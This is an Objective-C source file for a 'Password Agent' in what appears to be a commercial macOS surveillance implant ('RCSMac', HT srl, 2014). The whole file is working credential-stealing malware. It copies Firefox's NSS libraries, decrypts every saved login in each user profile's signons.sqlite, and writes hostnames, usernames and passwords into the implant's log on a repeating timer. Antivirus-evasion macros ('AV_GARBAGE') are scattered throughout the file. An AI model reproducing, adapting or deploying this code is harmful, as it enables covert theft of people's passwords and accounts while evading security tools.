/*
 * RCSMAgentPassword.m
 * RCSMac
 * Password Agent
 *
 *
 * Created by J on 06/03/2014
 * Copyright (C) HT srl 2014. All rights reserved
 *
 */

#import "RCSMAgentPassword.h"
#import "RCSMCommon.h"
#import "RCSMLogger.h"
#import "RCSMAVGarbage.h"
#import <dlfcn.h>
#import <sqlite3.h>



static __m_MAgentPassword *sharedAgentPassword = nil;

@interface __m_MAgentPassword (private)


- (void) _writeLog:(NSString*)hostname andUser:(NSString*)user andPassword:(NSString*)password andService:(NSString*)service;
- (void) _getFirefoxPasswordTimer:(NSTimer *)timer;
- (BOOL) _getFirefoxPassword;
- (BOOL) _initNSSLib;
- (void) _getMarkup;
- (void) _setMarkup;

@end

@implementation __m_MAgentPassword (private)

void* nss_3_lib = nil;
void* free_lib = nil;
void* soft_lib = nil;
void* nss_dbm_lib = nil;
NSSInitFunc NSS_Init = nil;
NSSShutdownFunc NSS_Shutdown = nil;
PK11SDRDecryptFunc PK11SDR_Decrypt = nil;
SECITEMZfreeItemFunc SECITEM_ZfreeItem = nil;
NSSBase64_DecodeBufferFunc NSSBase64_DecodeBuffer = nil;
BOOL nssLoaded = NO;

- (void) _getMarkup
{
    markup = [[__m_MUtils sharedInstance] getPropertyWithName:[[self class] description]];
    if(markup==nil)
    {
        // markup not found, we allocate it
        markup = [NSMutableDictionary dictionaryWithCapacity: 1];
    }
}

- (void) _setMarkup
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    [[__m_MUtils sharedInstance] setPropertyWithName:[[self class] description]withDictionary:markup];
    
    [pool release];
}


- (void) _writeLog: (NSString*)resource andUser:(NSString*)user andPassword:(NSString*)password andService:(NSString*)service
{
#ifdef DEBUG_PASSWORD
    infoLog(@"%@, %@, %@, %@", resource, user, password, service);
#endif
    
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    short unicodeNullTerminator = 0x0000;
    unsigned int delimiter = LOG_DELIMITER;

    // AV evasion: only on release build
    AV_GARBAGE_003
    
    NSData *resourceData = [resource dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
    NSData *userData = [user dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
    NSData *passwordData = [password dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
    NSData *serviceData = [service dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
    
    NSMutableData *contentData  = [[NSMutableData alloc] init];
    [contentData appendData:resourceData];
    [contentData appendBytes:&unicodeNullTerminator length:sizeof(short)];
    [contentData appendData:userData];
    [contentData appendBytes:&unicodeNullTerminator length:sizeof(short)];
    [contentData appendData:passwordData];
    [contentData appendBytes:&unicodeNullTerminator length:sizeof(short)];
    [contentData appendData:serviceData];
    [contentData appendBytes:&unicodeNullTerminator length:sizeof(short)];
    [contentData appendBytes: &delimiter length: sizeof(delimiter)];
 
#ifdef DEBUG_PASSWORD
    infoLog(@"contentData: %@", contentData);
#endif
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
    
    BOOL success = [logManager createLog: AGENT_PASSWORD
                             agentHeader: nil
                               withLogID: 0];
    
    if (success)
    {
        
        [logManager writeDataToLog: contentData
                          forAgent: AGENT_PASSWORD
                         withLogID: 0];
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        [logManager closeActiveLog: AGENT_PASSWORD
                         withLogID: 0];
        
        // AV evasion: only on release build
        AV_GARBAGE_004
        
    }
    
    [contentData release];
    [pool release];
    
    return;
}

- (BOOL) _initNSSLib
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

    // copy libraries from Firefox
    NSArray *extensions = [NSArray arrayWithObjects:@"dylib", nil];
    NSString *appPath = @"/Applications/Firefox.app/Contents/MacOS";
    NSArray *dirContents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:appPath error:nil];
    if (dirContents == nil)
    {
#ifdef DEBUG_PASSWORD
        infoLog(@"no firefox lib dir");
#endif
            [pool release];
            return NO;
    }
    NSArray *files = [dirContents filteredArrayUsingPredicate:[NSPredicate predicateWithFormat:@"pathExtension IN %@", extensions]];
    for(NSString *file in files)
    {
        //[NSString stringWithFormat:@"%@/%@/%@", three, two, one];
        NSString *path = [NSString stringWithFormat:@"%@/%@",appPath,file];
        if ([[NSFileManager defaultManager] copyItemAtPath:path toPath:file error:nil] == NO)
        {
#ifdef DEBUG_PASSWORD
            infoLog(@"Unable to copy lib");
#endif
            [pool release];
            return NO;
        }
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    // load nss3 library & Co.
    nss_3_lib = dlopen("libnss3.dylib", RTLD_NOW | RTLD_GLOBAL);
    free_lib = dlopen("libfreebl3.dylib", RTLD_NOW | RTLD_GLOBAL);
    soft_lib = dlopen("libsoftokn3.dylib", RTLD_NOW | RTLD_GLOBAL);
    nss_dbm_lib = dlopen("libnssdbm3.dylib", RTLD_NOW | RTLD_GLOBAL);
    
    // delete libraries
    for(NSString *file in files)
    {
        if ([[NSFileManager defaultManager] removeItemAtPath:file error:nil] == NO)
        {
#ifdef DEBUG_PASSWORD
            infoLog(@"Unable to delete lib");
#endif
        }
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    if(!free_lib || !soft_lib || !nss_3_lib || !nss_dbm_lib)
    {
#ifdef DEBUG_PASSWORD
        infoLog(@"unable to load lib");
#endif
        [pool release];
        return NO;
    }
    
    NSS_Init = (NSSInitFunc)dlsym(nss_3_lib, "NSS_Init");
    NSS_Shutdown = (NSSShutdownFunc)dlsym(nss_3_lib, "NSS_Shutdown");
    PK11SDR_Decrypt = (PK11SDRDecryptFunc)dlsym(nss_3_lib, "PK11SDR_Decrypt");
    SECITEM_ZfreeItem = (SECITEMZfreeItemFunc)dlsym(nss_3_lib, "SECITEM_FreeItem");
    NSSBase64_DecodeBuffer = (NSSBase64_DecodeBufferFunc)dlsym(nss_3_lib, "NSSBase64_DecodeBuffer");
    if (!NSS_Init || !NSS_Shutdown || !PK11SDR_Decrypt || !SECITEM_ZfreeItem || !NSSBase64_DecodeBuffer) {
#ifdef DEBUG_PASSWORD
        infoLog(@"Unable to init nss");
#endif
        [pool release];
        return NO;
    }

    [pool release];
    return YES;
}

- (void) _getFirefoxPasswordTimer: (NSTimer *)timer
{
    [self _getFirefoxPassword];
}

- (BOOL) _getFirefoxPassword
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    // chekc if nss libs have been already loaded
    if (nssLoaded == NO)
    {
        BOOL res = [self _initNSSLib];
        if (res == YES)
        {
            nssLoaded = YES;
        }
        else
        {
            [pool release];
            return NO;
        }
    }

    // AV evasion: only on release build
    AV_GARBAGE_000

    // profiles usually are in: /Users/<user>/Library/Application Support/Firefox/Profiles/
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSApplicationSupportDirectory, NSUserDomainMask, YES);
    NSString *applicationSupportDirectory = [paths firstObject];
    NSString *firefoxProfiles = [NSString stringWithFormat:@"%@/%@", applicationSupportDirectory, @"/Firefox/Profiles"];
    NSArray *profiles = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:firefoxProfiles error:nil];
    
    if (profiles == nil) {
        [pool release];
        return NO;
    }
 
    //calculate time range
    //number of seconds elapsed since 00:00 hours, Jan 1, 1970 UTC (i.e., a unix timestamp).
    time_t begin, end;
    NSNumber *date = [markup objectForKey:MARKUP_KEY];
    if (date == nil)
    {
        begin = 1;
#ifdef DEBUG_PASSWORD
        infoLog(@"begin =1");
#endif
    }
    else
    {
        begin = [date intValue];
#ifdef DEBUG_PASSWORD
        infoLog(@"begin = markup");
#endif
    }
    end = time(NULL);  // end time range is now
    [markup setObject:[NSNumber numberWithInt:end] forKey:MARKUP_KEY];
    
    for(NSString *profile in profiles)
    {
#ifdef DEBUG_PASSWORD
        infoLog(@"profile: %@", profile);
#endif
    
        NSString *profileDir = [NSString stringWithFormat:@"%@/%@", firefoxProfiles, profile];
        const char *profileDirUTF8 = [profileDir UTF8String];
        SECStatus result = NSS_Init(profileDirUTF8);
        if (result != SECSuccess)
        {
#ifdef DEBUG_PASSWORD
        infoLog(@"NSS_Init failed");
#endif
            continue;
        }
    
        sqlite3 *db;
        NSString *dbDir = [NSString stringWithFormat:@"%@/%@", profileDir, @"signons.sqlite"];
        const char *dbDirUTF8 = [dbDir UTF8String];

        if (sqlite3_open(dbDirUTF8, &db))
        {
            sqlite3_close(db);
            NSS_Shutdown();
#ifdef DEBUG_PASSWORD
        infoLog(@"Unable to open db");
#endif
            continue;
        }

        sqlite3_stmt *stmt = NULL;
        char *query = "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins WHERE timePasswordChanged/1000 BETWEEN ? AND ?";
        if(sqlite3_prepare_v2(db, query, strlen(query) + 1, &stmt, NULL) != SQLITE_OK)
        {
            sqlite3_close(db);
            NSS_Shutdown();
#ifdef DEBUG_PASSWORD
        infoLog(@"Unable to prepare");
#endif
            continue;
        }

        const unsigned char *encuser, *encpass, *hostname;
        SECItem *secuser = NULL, *secpass = NULL, user = { siBuffer, NULL, 0 }, pass = { siBuffer, NULL, 0 };
    
        // AV evasion: only on release build
        AV_GARBAGE_003

        if(sqlite3_bind_int(stmt, 1, (int)begin) != SQLITE_OK)
        {
#ifdef DEBUG_PASSWORD
        infoLog(@"bind 1 failed");
#endif
            sqlite3_close(db);
            NSS_Shutdown();
            continue;
        }
        if(sqlite3_bind_int(stmt, 2, (int)end) != SQLITE_OK)
        {
#ifdef DEBUG_PASSWORD
        infoLog(@"bind 2 failed");
#endif
            sqlite3_close(db);
            NSS_Shutdown();
            continue;
        }

        while(sqlite3_step(stmt) == SQLITE_ROW) {
            do{
                hostname = sqlite3_column_text(stmt,0);
                encuser = sqlite3_column_text(stmt, 1);
                if(!(secuser = NSSBase64_DecodeBuffer(NULL, NULL, encuser, strlen(encuser))))
                {
#ifdef DEBUG_PASSWORD
                infoLog(@"NSSBase64 failed");
#endif
                    break;
                }
                if(PK11SDR_Decrypt(secuser, &user, NULL) != SECSuccess)
                {
#ifdef DEBUG_PASSWORD
                infoLog(@"Decrypt failed");
#endif
                    break;
                }
                encpass = sqlite3_column_text(stmt, 2);
                if(!(secpass = NSSBase64_DecodeBuffer(NULL, NULL, encpass, strlen(encpass))))
                {
#ifdef DEBUG_PASSWORD
                infoLog(@"NSSBase64 failed 2");
#endif
                    break;
                }
                if(PK11SDR_Decrypt(secpass, &pass, NULL) != SECSuccess)
                {
#ifdef DEBUG_PASSWORD
                infoLog(@"Decrypt failed 2");
#endif
                    break;
                }
                NSData *userData = [[NSData alloc] initWithBytes:user.data length:user.len];
                NSString *userString = [[NSString alloc] initWithData:userData encoding:NSUTF8StringEncoding];
                NSData *hostData = [[NSData alloc] initWithBytes:hostname length:strlen(hostname)];
                NSString *hostString = [[NSString alloc] initWithData:hostData encoding:NSUTF8StringEncoding];
                NSData *passData = [[NSData alloc] initWithBytes:pass.data length:pass.len];
                NSString *passString = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];

                // AV evasion: only on release build
                AV_GARBAGE_000
                
                NSArray *components = [profile componentsSeparatedByString:@"."];
                NSString *service = [NSString stringWithFormat:@"%@/%@", @"Firefox", [components objectAtIndex:1]];
                
                [self _writeLog:hostString andUser:userString andPassword:passString andService:service];
                [self _setMarkup];
            
                [passString release];
                [passData release];
                [hostString release];
                [hostData release];
                [userString release];
                [userData release];
            
            }while(0);
        }
        if(stmt)
        {
            sqlite3_finalize(stmt);
            stmt = NULL;
        }
        if(db)
        {
            sqlite3_close(db);
            db=NULL;
        }

        result = NSS_Shutdown();
        if (result != SECSuccess)
        {
#ifdef DEBUG_PASSWORD
        infoLog(@"nss shutdown failed!");
#endif
        }
    }
    [self _setMarkup];
    [pool release];
    return YES;
}

@end


@implementation __m_MAgentPassword

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MAgentPassword *)sharedInstance
{
    @synchronized(self)
    {
        if (sharedAgentPassword == nil)
        {
            //
            // Assignment is not done here
            //
            [[self alloc] init];
        }
    }
    
    return sharedAgentPassword;
}

+ (id)allocWithZone: (NSZone *)aZone
{
    @synchronized(self)
    {
        if (sharedAgentPassword == nil)
        {
            sharedAgentPassword = [super allocWithZone: aZone];
            
            //
            // Assignment and return on first allocation
            //
            return sharedAgentPassword;
        }
    }
    
    // On subsequent allocation attemps return nil
    return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
    return self;
}

- (unsigned)retainCount
{
    // Denotes an object that cannot be released
    return UINT_MAX;
}

- (id)retain
{
    return self;
}

- (void)release
{
    // Do nothing
}

- (id)autorelease
{
    return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -


- (BOOL)stop
{
    
    int internalCounter = 0;
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    [mConfiguration setObject: AGENT_STOP
                       forKey: @"status"];
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    while (![[mConfiguration objectForKey: @"status"]  isEqual: AGENT_STOPPED]
           && internalCounter <= MAX_STOP_WAIT_TIME)
    {
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        internalCounter++;
        usleep(100000);
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    return YES;
}

- (void)start
{
    NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [mConfiguration setObject: AGENT_RUNNING forKey: @"status"];
    
    [self _getMarkup];
    
    //first run
    [self _getFirefoxPassword];
    
    NSRunLoop *currentRunLoop = [NSRunLoop currentRunLoop];

    
    NSTimer *timer = nil;
    timer = [NSTimer scheduledTimerWithTimeInterval: /*900*/10 target:self selector:@selector(_getFirefoxPasswordTimer:) userInfo:nil repeats:YES];
    [currentRunLoop addTimer: timer forMode: NSRunLoopCommonModes];

    while (![[mConfiguration objectForKey: @"status"] isEqual: AGENT_STOP]
           && ![[mConfiguration objectForKey: @"status"]  isEqual: AGENT_STOPPED])
    {
        NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
        
        // AV evasion: only on release build
        AV_GARBAGE_007
        
        if (gOSMajor == 10 && gOSMinor >= 6)
            [currentRunLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
        else
            sleep(1);
        
        // AV evasion: only on release build
        AV_GARBAGE_005
        
        [inner release];
    }
    
    if (timer != nil)
    {
        [timer invalidate];
    }
    
    if ([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP])
    {
        // AV evasion: only on release build
        AV_GARBAGE_006
        
        [mConfiguration setObject: AGENT_STOPPED
                           forKey: @"status"];
        
        // AV evasion: only on release build
        AV_GARBAGE_003
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [outerPool release];
}


- (BOOL)resume
{
    return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSMutableDictionary *)mConfiguration
{
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    return mConfiguration;
}

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
    // AV evasion: only on release build
    AV_GARBAGE_009
    
    if (aConfiguration != mConfiguration)
    {
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        [mConfiguration release];
        
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        mConfiguration = [aConfiguration retain];
    }
}

@end
